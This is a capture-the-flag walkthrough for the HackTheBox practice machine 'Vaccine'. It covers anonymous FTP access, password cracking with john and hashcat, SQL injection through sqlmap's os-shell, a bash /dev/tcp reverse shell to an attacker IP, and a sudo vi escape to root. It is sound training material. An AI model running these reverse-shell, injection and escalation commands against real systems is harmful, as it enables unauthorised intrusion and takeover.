---
description: Full attack path for the HTB Starting Point machine Vaccine.
---

# Vaccine

Use this page to track the full attack path for `Vaccine`.

### Target

* OS: `Linux`
* Difficulty: `Easy`
* Topics: `FTP`, `Password cracking`, `SQL injection`, `Reverse shell`, `Privilege escalation`

### Enumeration

#### Network enumeration

```bash
sudo nmap -sC -sV <target_IP>
```

**Findings**

* `21/tcp` runs FTP with `vsftpd 3.0.3`
* Anonymous FTP login is allowed
* `22/tcp` runs SSH with `OpenSSH 8.0p1`
* `80/tcp` runs Apache `2.4.41`
* The web title is `MegaCorp Login`

#### FTP enumeration

Anonymous login is allowed.

Log in and download the backup:

```bash
ftp <target_IP>
# Name: anonymous
# Password: <empty>

ftp> dir
ftp> get backup.zip
ftp> exit
```

**Findings**

* FTP exposes `backup.zip`
* The ZIP becomes the best next lead

{% hint style="warning" %}
If you cannot transfer the ZIP, check your VPN interface.

Your VPN MTU may be too large, which can cause the firewall to drop packets silently.

Temporarily lower the MTU on your HTB VPN interface, usually `tun0`:

```bash
sudo ifconfig tun0 mtu 1200
```
{% endhint %}

### Recover credentials from the backup

#### Crack the ZIP password

Convert the ZIP to a crackable hash:

```bash
zip2john backup.zip > hashes
```

Crack it with `rockyou`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
john --show hashes
```

**Findings**

* ZIP password: `741852963`

Extract the archive:

```bash
unzip backup.zip
# enter password: 741852963
```

#### Read the PHP source

The archive contains `index.php` and `style.css`.

Review the PHP source:

```bash
cat index.php
```

**Findings**

* Hardcoded credential pair:

```
admin : 2cb42f8734ea607eefed3b70af13bbd3
```

* The password is stored as an MD5 hash

#### Crack the MD5 hash

Identify the hash type:

```bash
hashid 2cb42f8734ea607eefed3b70af13bbd3
# Likely MD5 (mode 0)
```

Crack it with Hashcat:

```bash
echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

**Findings**

* Admin password: `qwerty789`

### Foothold

#### Log in to the web app

Browse to `http://<target_IP>` and log in with:

```
admin:qwerty789
```

The app loads a car catalogue dashboard.

The search bar uses the `?search=` parameter, which is a strong SQL injection candidate.

#### Confirm SQL injection with sqlmap

Grab the active session cookie:

```
PHPSESSID=<your_session_id>
```

Run `sqlmap`:

```bash
sqlmap -u 'http://<target_IP>/dashboard.php?search=any' \
  --cookie="PHPSESSID=<your_session_id>"
```

**Findings**

* The `search` parameter is vulnerable to SQL injection

#### Get a shell with sqlmap

Launch `os-shell`:

```bash
sqlmap -u 'http://<target_IP>/dashboard.php?search=any' \
  --cookie="PHPSESSID=<your_session_id>" \
  --os-shell
```

Start a listener:

```bash
sudo nc -lvnp 4444
```

From the `os-shell`, send a reverse shell:

```bash
os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.140/4444 0>&1"
```

{% hint style="info" %}
Port `443` may be egress-filtered. Use `4444` or `9001`.
{% endhint %}

#### Stabilize the shell

Upgrade the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Background it, then fix the terminal on your attacker host:

```bash
stty raw -echo
fg
```

Back in the target shell:

```bash
export TERM=xterm
```

You now have an interactive shell as `postgres`.

### User flag

```bash
cat /var/lib/postgresql/user.txt
```

### Privilege escalation

#### Find database credentials

Review the web files:

```bash
cd /var/www/html
ls -la
cat dashboard.php
```

**Findings**

* `dashboard.php` exposes the PostgreSQL password:

```
host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!
```

#### Reuse the password over SSH

```bash
ssh postgres@<target_IP>
# password: P@s5w0rd!
```

#### Check `sudo` rights

```bash
sudo -l
# password: P@s5w0rd!
```

Output:

```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

#### Escape from `vi`

Open the allowed file:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside `vi`, run:

```
:set shell=/bin/sh
:shell
```

This drops you into a root shell.

### Root flag

```bash
cat /root/root.txt
```

### Attack chain summary

```
Anonymous FTP
    → backup.zip
    → John (zip password: 741852963)
    → index.php (MD5 hash)
    → Hashcat (qwerty789)
    → Web login as admin
    → SQLi via sqlmap
    → os-shell
    → reverse shell on port 4444
    → TTY upgrade
    → dashboard.php leaks P@s5w0rd!
    → SSH as postgres
    → sudo -l
    → vi on pg_hba.conf
    → GTFOBins escape
    → root
```

### Takeaways

* Always test anonymous FTP early
* Backup files often expose source code and credentials
* MD5 falls quickly with common wordlists
* SQL injection can turn directly into code execution
* `sudo` access to text editors often leads straight to root
